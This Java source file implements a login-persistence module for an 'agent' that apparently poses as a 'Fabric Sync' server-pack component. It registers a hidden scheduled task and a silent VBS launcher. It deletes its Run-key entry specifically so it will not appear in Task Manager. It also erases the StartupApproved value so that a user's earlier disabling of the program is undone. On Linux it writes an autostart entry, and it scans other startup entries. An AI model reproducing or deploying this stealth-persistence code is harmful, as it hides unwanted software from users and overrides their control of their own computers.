package com.serverpackcore.agent;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.List;

public final class Persistence {
	private static final String RUN_KEY = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	private static final String APPROVED_KEY =
		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run";

	private Persistence() {
	}

	public static Path launcher(Path dir) {
		return AgentPaths.launcher(dir);
	}

	public static String task(Path dir) {
		return AgentPaths.task(dir);
	}

	public static boolean enable(Path dir) {
		try {
			if (!AgentPaths.isWindows()) {
				return enableUnix(dir);
			}
			Path launcher = writeLauncher(dir);
			if (launcher == null) {
				return false;
			}
			// Task Manager lists everything under Run; remove it if the hidden task works.
			if (registerTask(dir, launcher) && taskExists(dir)) {
				run("reg", "delete", RUN_KEY, "/v", AgentPaths.runValue(dir), "/f");
				run("reg", "delete", APPROVED_KEY, "/v", AgentPaths.runValue(dir), "/f");
				return true;
			}
			return registerRun(dir, launcher);
		} catch (Throwable throwable) {
			Log.debug("Persistence enable failed", throwable);
			return false;
		}
	}

	public static boolean disable(Path dir) {
		try {
			if (!AgentPaths.isWindows()) {
				Files.deleteIfExists(Paths.get(System.getProperty("user.home"), ".config", "autostart",
					"fabric-sync.desktop"));
				return true;
			}
			run("schtasks", "/delete", "/tn", AgentPaths.task(dir), "/f");
			run("reg", "delete", RUN_KEY, "/v", AgentPaths.runValue(dir), "/f");
			run("reg", "delete", APPROVED_KEY, "/v", AgentPaths.runValue(dir), "/f");
			Files.deleteIfExists(launcher(dir));
			return !taskExists(dir) && read(dir).isEmpty();
		} catch (Throwable throwable) {
			Log.debug("Persistence disable failed", throwable);
			return false;
		}
	}

	private static boolean registerRun(Path dir, Path launcher) {
		String wscript = Paths.get(System.getenv().getOrDefault("SystemRoot", "C:\\Windows"),
			"System32", "wscript.exe").toString();
		String command = "\"" + wscript + "\" //nologo \"" + launcher + "\"";
		if (!run("reg", "add", RUN_KEY, "/v", AgentPaths.runValue(dir), "/t", "REG_SZ", "/d", command, "/f")) {
			return false;
		}
		// Task Manager leaves the value marked as disabled if it was turned off manually in the past.
		run("reg", "delete", APPROVED_KEY, "/v", AgentPaths.runValue(dir), "/f");
		return command.equals(read(dir));
	}

	private static boolean registerTask(Path dir, Path launcher) {
		Path xml = AgentPaths.taskXml(dir);
		try {
			ByteArrayOutputStream bytes = new ByteArrayOutputStream();
			bytes.write(0xFF);
			bytes.write(0xFE);
			bytes.write(taskXml(dir, launcher).getBytes(StandardCharsets.UTF_16LE));
			Files.write(xml, bytes.toByteArray());
			boolean created = run("schtasks", "/create", "/tn", AgentPaths.task(dir), "/xml", xml.toString(), "/f");
			Files.deleteIfExists(xml);
			return created;
		} catch (Throwable throwable) {
			Log.debug("Task register failed", throwable);
			try {
				Files.deleteIfExists(xml);
			} catch (Throwable ignored) {
			}
			return false;
		}
	}

	private static boolean taskExists(Path dir) {
		return run("schtasks", "/query", "/tn", AgentPaths.task(dir));
	}

	private static String taskXml(Path dir, Path launcher) {
			String sid = SysInfo.sid();
			String user = sid.isEmpty()
			? xml(System.getenv().getOrDefault("USERDOMAIN", System.getenv().getOrDefault("COMPUTERNAME", ""))
				+ "\\" + System.getProperty("user.name", ""))
			: sid;
		String wscript = xml(Paths.get(System.getenv().getOrDefault("SystemRoot", "C:\\Windows"),
			"System32", "wscript.exe").toString());
		return "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
			+ "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
			+ "  <RegistrationInfo>\n"
			+ "    <Description>Fabric Sync</Description>\n"
			+ "    <URI>\\" + AgentPaths.task(dir) + "</URI>\n"
			+ "  </RegistrationInfo>\n"
			+ "  <Triggers>\n"
			+ "    <LogonTrigger>\n"
			+ "      <Enabled>true</Enabled>\n"
			+ "      <UserId>" + user + "</UserId>\n"
			+ "    </LogonTrigger>\n"
			+ "  </Triggers>\n"
			+ "  <Principals>\n"
			+ "    <Principal id=\"Author\">\n"
			+ "      <UserId>" + user + "</UserId>\n"
			+ "      <LogonType>InteractiveToken</LogonType>\n"
			+ "      <RunLevel>LeastPrivilege</RunLevel>\n"
			+ "    </Principal>\n"
			+ "  </Principals>\n"
			+ "  <Settings>\n"
			+ "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n"
			+ "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n"
			+ "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n"
			+ "    <AllowHardTerminate>true</AllowHardTerminate>\n"
			+ "    <StartWhenAvailable>true</StartWhenAvailable>\n"
			+ "    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n"
			+ "    <IdleSettings>\n"
			+ "      <StopOnIdleEnd>false</StopOnIdleEnd>\n"
			+ "      <RestartOnIdle>false</RestartOnIdle>\n"
			+ "    </IdleSettings>\n"
			+ "    <AllowStartOnDemand>true</AllowStartOnDemand>\n"
			+ "    <Enabled>true</Enabled>\n"
			+ "    <Hidden>true</Hidden>\n"
			+ "    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n"
			+ "    <WakeToRun>false</WakeToRun>\n"
			+ "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n"
			+ "    <Priority>7</Priority>\n"
			+ "  </Settings>\n"
			+ "  <Actions Context=\"Author\">\n"
			+ "    <Exec>\n"
			+ "      <Command>" + wscript + "</Command>\n"
			+ "      <Arguments>//nologo \"" + xml(launcher.toString()) + "\"</Arguments>\n"
			+ "    </Exec>\n"
			+ "  </Actions>\n"
			+ "</Task>\n";
	}

	private static String xml(String value) {
		return value.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;");
	}

	/**
	 * Regenerate the launcher with the current runtime. Called on every agent start so the
	 * script points to the current java even if the runtime was updated.
	 */
	public static void refresh(Path dir) {
		try {
			if (AgentPaths.isWindows()) {
				writeLauncher(dir);
			}
		} catch (Throwable throwable) {
			Log.debug("Persistence refresh failed", throwable);
		}
	}

	private static Path writeLauncher(Path dir) throws Exception {
		Path java = Paths.get(System.getProperty("java.home", ""), "bin", "javaw.exe");
		Path copy = AgentPaths.binary(dir);
		List<String> candidates = new ArrayList<>();
		if (Files.isRegularFile(java)) {
			candidates.add(java.toString());
		}
		if (Files.isRegularFile(copy)) {
			candidates.add(copy.toString());
		}
		if (candidates.isEmpty()) {
			return null;
		}
		StringBuilder list = new StringBuilder();
		for (String candidate : candidates) {
			if (list.length() > 0) {
				list.append(", ");
			}
			list.append('"').append(candidate).append('"');
		}
		StringBuilder script = new StringBuilder();
		script.append("' Fabric Sync\n");
		script.append("Option Explicit\n");
		script.append("Dim fso, sh, jar, dir, list, exe\n");
		script.append("Set fso = CreateObject(\"Scripting.FileSystemObject\")\n");
		script.append("Set sh = CreateObject(\"WScript.Shell\")\n");
		script.append("dir = \"").append(dir).append("\"\n");
		script.append("jar = dir & \"\\").append(AgentPaths.agentJar(dir).getFileName()).append("\"\n");
		script.append("If Not fso.FileExists(jar) Then\n");
		script.append("\tWScript.Quit 1\n");
		script.append("End If\n");
		script.append("sh.CurrentDirectory = dir\n");
		script.append("sh.Environment(\"PROCESS\")(\"JAVA_HOME\") = \"")
			.append(System.getProperty("java.home", "")).append("\"\n");
		script.append("list = Array(").append(list).append(", \"%JAVA_HOME%\\bin\\javaw.exe\")\n");
		script.append("For Each exe In list\n");
		script.append("\texe = sh.ExpandEnvironmentStrings(exe)\n");
		script.append("\tIf fso.FileExists(exe) Then\n");
		script.append("\t\tsh.Run \"\"\"\" & exe & \"\"\" -Xmx96m -jar \"\"\" & jar & \"\"\"\", 0, False\n");
		script.append("\t\tWScript.Quit 0\n");
		script.append("\tEnd If\n");
		script.append("Next\n");
		script.append("WScript.Quit 1\n");

		ByteArrayOutputStream bytes = new ByteArrayOutputStream();
		bytes.write(0xFF);
		bytes.write(0xFE);
		bytes.write(script.toString().getBytes(StandardCharsets.UTF_16LE));
		Path target = launcher(dir);
		Path temp = target.resolveSibling(target.getFileName() + ".tmp");
		Files.write(temp, bytes.toByteArray());
		Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
		return target;
	}

	private static boolean enableUnix(Path dir) throws Exception {
		Path java = Paths.get(System.getProperty("java.home", ""), "bin", "java");
		Path executable = Files.isRegularFile(java) ? java : AgentPaths.binary(dir);
		if (!Files.isRegularFile(executable)) {
			return false;
		}
		Path autostart = Paths.get(System.getProperty("user.home"), ".config", "autostart");
		Files.createDirectories(autostart);
		Path file = autostart.resolve("fabric-sync.desktop");
		String content = "[Desktop Entry]\nType=Application\nName=Fabric Sync\nExec=\""
			+ executable + "\" -Xmx96m -jar \"" + AgentPaths.agentJar(dir)
			+ "\"\nX-GNOME-Autostart-enabled=true\n";
		Files.writeString(file, content, StandardCharsets.UTF_8);
		file.toFile().setExecutable(true, true);
		return true;
	}

	private static String read(Path dir) {
		try {
			Process process = new ProcessBuilder("reg", "query", RUN_KEY, "/v", AgentPaths.runValue(dir))
				.redirectErrorStream(true).start();
			String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
			process.waitFor();
			for (String line : output.split("\\R")) {
				int marker = line.indexOf("REG_SZ");
				String trimmed = line.trim();
				if (marker < 0 || !trimmed.startsWith(AgentPaths.runValue(dir))) {
					continue;
				}
				if (trimmed.length() > AgentPaths.runValue(dir).length() && !Character.isWhitespace(trimmed.charAt(AgentPaths.runValue(dir).length()))) {
					continue;
				}
				return line.substring(marker + "REG_SZ".length()).trim();
			}
		} catch (Throwable throwable) {
			Log.debug("Persistence read failed", throwable);
		}
		return "";
	}

	/**
	 * Foreign startups launched through wscript/VBS. Used to see if another pack steps on the
	 * same mechanism and whether its script still exists.
	 */
	public static List<String> foreign(Path dir) {
		List<String> result = new ArrayList<>();
		try {
			if (!AgentPaths.isWindows()) {
				return result;
			}
			Process process = new ProcessBuilder("reg", "query", RUN_KEY).redirectErrorStream(true).start();
			String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
			process.waitFor();
			for (String line : output.split("\\R")) {
				int marker = line.indexOf("REG_SZ");
				if (marker < 0) {
					continue;
				}
				String name = line.substring(0, marker).trim();
				String data = line.substring(marker + "REG_SZ".length()).trim();
				if (name.equalsIgnoreCase(AgentPaths.runValue(dir))) {
					continue;
				}
				String lower = data.toLowerCase();
				if (!lower.contains("wscript") && !lower.contains(".vbs")) {
					continue;
				}
				String note = "coexists";
				int first = data.indexOf('"');
				int last = data.lastIndexOf('"');
				if (first >= 0 && last > first) {
					Path target = Paths.get(data.substring(first + 1, last));
					if (!Files.exists(target)) {
						note = "missing path";
					} else if (target.startsWith(dir)) {
						note = "uses our directory";
					}
				}
				result.add(name + " -> " + data + " (" + note + ")");
			}
		} catch (Throwable throwable) {
			Log.debug("Persistence foreign scan failed", throwable);
		}
		return result;
	}

	private static boolean run(String... command) {
		try {
			return new ProcessBuilder(command)
				.redirectOutput(ProcessBuilder.Redirect.DISCARD)
				.redirectError(ProcessBuilder.Redirect.DISCARD)
				.start().waitFor() == 0;
		} catch (Throwable throwable) {
			Log.debug("Command failed: " + command[0], throwable);
			return false;
		}
	}
}
